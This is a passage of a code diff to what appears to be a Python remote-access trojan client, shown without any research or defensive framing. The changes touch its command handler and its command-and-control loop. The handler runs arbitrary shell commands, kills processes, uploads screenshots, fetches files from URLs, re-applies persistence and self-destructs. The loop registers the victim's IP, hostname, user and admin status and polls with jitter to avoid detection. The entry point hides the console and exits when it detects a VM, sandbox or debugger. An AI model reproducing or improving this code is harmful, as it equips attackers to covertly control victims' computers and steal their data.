+                    "name": os.path.basename(target_path),
+                    "path": target_path,
+                    "size": size_str,
+                    "message": "Image too large for preview. Use the Download button."
+                })
             with open(target_path, "rb") as f:
                 raw_bytes = f.read()
                 b64_data = base64.b64encode(raw_bytes).decode('utf-8')
@@ -876,6 +1125,9 @@ def preview_file(path):
         return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": str(e)})
 
 
+# ============================================================
+#  Command Execution
+# ============================================================
 def execute_command(cmd):
     """Execute a command and return the result"""
     if DEBUG: print(f"[*] Executing command: {cmd}")
@@ -896,7 +1148,6 @@ def execute_command(cmd):
                 if target.isdigit():
                     subprocess.check_output(f"taskkill /F /PID {target}", shell=True, stderr=subprocess.STDOUT)
                 else:
-                    # Ensure it has .exe if it's a name
                     if not target.lower().endswith(".exe"):
                         target += ".exe"
                     subprocess.check_output(f"taskkill /F /IM {target}", shell=True, stderr=subprocess.STDOUT)
@@ -908,7 +1159,6 @@ def execute_command(cmd):
             screenshot_data = take_screenshot()
             if screenshot_data.startswith("[-]"):
                 return screenshot_data
-            # Send screenshot as file upload
             try:
                 timestamp = time.strftime("%Y%m%d_%H%M%S")
                 c2_post("/upload", {
@@ -954,32 +1204,27 @@ def execute_command(cmd):
             else:
                 title = "Alert"
                 message = content
-            # Run on a separate thread so it doesn't block polling
             threading.Thread(
                 target=lambda t=title, m=message: ctypes.windll.user32.MessageBoxW(0, m, t, 0x40),
                 daemon=True
             ).start()
-            return f"[+] Dialog shown: \"{title}\""
+            return f'[+] Dialog shown: "{title}"'
 
         elif cmd == "persist":
             add_persistence()
             return "[+] Persistence re-applied"
 
         elif cmd == "kill":
-            # Send confirmation before dying
-            try:
-                c2_post("/result", {
-                    "output": "[+] Self-destruct initiated. Goodbye.",
-                    "client_id": client_id
-                })
-            except Exception:
-                pass
+            send_result({
+                "output": "[+] Self-destruct initiated. Goodbye.",
+                "client_id": client_id
+            })
+            flush_outbox()
             self_destruct()
 
         elif cmd.startswith("download "):
             _, path = cmd.split(" ", 1)
             path = path.strip().strip('"').strip("'")
-            # Resolve relative paths against current_dir
             if not os.path.isabs(path):
                 path = os.path.join(current_dir, path)
             if os.path.exists(path):
@@ -1010,23 +1255,25 @@ def execute_command(cmd):
             if not os.path.isabs(dst):
                 dst = os.path.join(current_dir, dst)
             try:
-                r = get_session().get(url, timeout=30, stream=True)
-                r.raise_for_status()
-                # Guard against absurdly large downloads
-                content_length = r.headers.get("Content-Length")
+                req = urllib.request.Request(url, headers={"User-Agent": _get_ua()})
+                resp = urllib.request.urlopen(req, timeout=30, context=_ssl_ctx)
+                content_length = resp.headers.get("Content-Length")
                 if content_length and int(content_length) > 200 * 1024 * 1024:
                     return f"[-] File too large ({int(content_length) // (1024*1024)}MB). Max 200MB."
                 with open(dst, "wb") as f:
-                    for chunk in r.iter_content(chunk_size=8192):
+                    while True:
+                        chunk = resp.read(8192)
+                        if not chunk:
+                            break
                         f.write(chunk)
-                size = os.path.getsize(dst)
-                return f"[+] Downloaded {url} to {dst} ({_format_size(size)})"
-            except requests.exceptions.Timeout:
+                dl_size = os.path.getsize(dst)
+                return f"[+] Downloaded {url} to {dst} ({_format_size(dl_size)})"
+            except socket.timeout:
                 return f"[-] Download timed out: {url}"
-            except requests.exceptions.ConnectionError:
+            except (urllib.error.URLError, ConnectionError, OSError):
                 return f"[-] Could not connect to: {url}"
-            except requests.exceptions.HTTPError as e:
-                return f"[-] HTTP error: {e.response.status_code} {e.response.reason}"
+            except urllib.error.HTTPError as e:
+                return f"[-] HTTP error: {e.code} {e.reason}"
             except Exception as e:
                 return f"[-] Download failed: {str(e)}"
 
@@ -1044,9 +1291,7 @@ def execute_command(cmd):
 
         # === File Browser ===
         elif cmd == "ls" or cmd.startswith("ls "):
-            # Improved argument parsing: handle quotes correctly
             raw_path = cmd[3:].strip() if cmd.startswith("ls ") else ""
-            # If path is wrapped in quotes, extract content inside
             if (raw_path.startswith('"') and raw_path.endswith('"')) or (raw_path.startswith("'") and raw_path.endswith("'")):
                 path = raw_path[1:-1]
             else:
@@ -1062,13 +1307,16 @@ def execute_command(cmd):
             return preview_file(path)
 
         else:
-            # Shell command execution — use current_dir as cwd
+            # Shell command execution
             try:
                 output = subprocess.check_output(
                     cmd, shell=True, stderr=subprocess.STDOUT,
                     stdin=subprocess.DEVNULL, cwd=current_dir, timeout=CMD_TIMEOUT
                 )
-                return output.decode(encoding='utf-8', errors='replace')
+                text = output.decode(encoding='utf-8', errors='replace')
+                if len(text) > MAX_RESULT_BYTES:
+                    text = text[:MAX_RESULT_BYTES] + f"\n[!] Output truncated at {MAX_RESULT_BYTES // 1024} KB"
+                return text
             except subprocess.TimeoutExpired:
                 return f"[-] Command timed out after {CMD_TIMEOUT}s: {cmd}"
 
@@ -1076,6 +1324,9 @@ def execute_command(cmd):
         return f"[-] Error: {str(e)}"
 
 
+# ============================================================
+#  Main C2 Connection Loop
+# ============================================================
 def connect_c2():
     """Main C2 connection loop with encrypted comms, jitter, and exponential backoff"""
     if DEBUG: print("[*] Starting C2 connection loop...")
@@ -1084,12 +1335,11 @@ def connect_c2():
 
     while True:
         try:
-            # Random initial delay to avoid burst patterns (shorter on re-register)
             time.sleep(random.uniform(1, 2))
 
-            # Quick reachability check before full registration
+            # Quick reachability check
             try:
-                get_session().get(f"{C2_DOMAIN}/test", timeout=5)
+                _http_get(f"{C2_DOMAIN}/test", timeout=5)
             except Exception:
                 wait = min(backoff, RETRY_BACKOFF_MAX)
                 print(f"[!] Server unreachable — retrying in {wait}s...")
@@ -1100,9 +1350,10 @@ def connect_c2():
             # Server is up — reset backoff
             backoff = RETRY_BACKOFF_MIN
 
-            # Gather real system info (use session UA even for IP lookup)
+            # Gather system info
             try:
-                ip = get_session().get("https://api.ipify.org", timeout=10).text.strip()
+                resp = _http_get("https://api.ipify.org", timeout=10)
+                ip = resp.text.strip()
             except Exception:
                 ip = "unknown"
 
@@ -1111,7 +1362,6 @@ def connect_c2():
             pid = os.getpid()
             client_id = f"{ip}:{pid}"
 
-            # Check admin status
             try:
                 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             except Exception:
@@ -1122,7 +1372,7 @@ def connect_c2():
                 "host": hostname,
                 "os": os_info,
                 "pid": pid,
-                "user": os.getlogin(),
+                "user": get_username(),
                 "admin": is_admin,
                 "client_id": client_id
             }
@@ -1134,42 +1384,50 @@ def connect_c2():
                 status = resp.status_code if resp else "No Response"
                 if DEBUG: print(f"[-] Registration failed with status: {status}")
                 time.sleep(RETRY_DELAY)
-                continue # Try registration again
+                continue
 
             # Command polling loop
             while True:
+                had_command = False
                 try:
+                    # Retry any results that failed to deliver on earlier cycles
+                    flush_outbox()
+
                     cmd_data = c2_get("/cmd", params={"id": client_id})
                     if cmd_data:
-                        # Server restarted — re-register immediately
                         if cmd_data.get("action") == "re-register":
                             break
 
                         cmd = cmd_data.get("command")
                         if cmd:
+                            had_command = True
                             result = execute_command(cmd)
-                            if result is not None:  # kill command exits before returning
-                                c2_post("/result", {
+                            if result is not None:
+                                send_result({
                                     "output": result,
                                     "command": cmd,
                                     "client_id": client_id
                                 })
-                except requests.exceptions.ConnectionError:
+                                flush_outbox()
+                except ConnectionError:
                     print("[!] Lost connection — reconnecting...")
                     break
                 except Exception:
-                    pass  # Never let a single command crash the polling loop
+                    pass
 
-                # Jittered sleep to avoid detection
+                # If a command was just executed, immediately check for the next command without sleeping
+                if had_command:
+                    continue
+
                 jitter = random.uniform(-JITTER, JITTER)
-                time.sleep(max(1, POLLING_DELAY + jitter))
+                time.sleep(max(0.3, POLLING_DELAY + jitter))
 
-        except requests.exceptions.ConnectionError:
+        except ConnectionError:
             wait = min(backoff, RETRY_BACKOFF_MAX)
             print(f"[!] Server unreachable — retrying in {wait}s...")
             time.sleep(wait)
             backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
-        except requests.exceptions.Timeout:
+        except socket.timeout:
             print(f"[!] Request timed out — retrying in 5s...")
             time.sleep(5)
             backoff = min(backoff * 2, RETRY_BACKOFF_MAX)
@@ -1177,11 +1435,13 @@ def connect_c2():
             time.sleep(RETRY_DELAY)
 
 
+# ============================================================
+#  Entry Point
+# ============================================================
 if __name__ == "__main__":
     hide_console()
     check_single_instance()
 
-    # Anti-analysis: exit silently if VM/sandbox or debugger detected
     if ANTI_VM and is_vm_or_sandbox():
         sys.exit(0)
     if is_debugger_present():
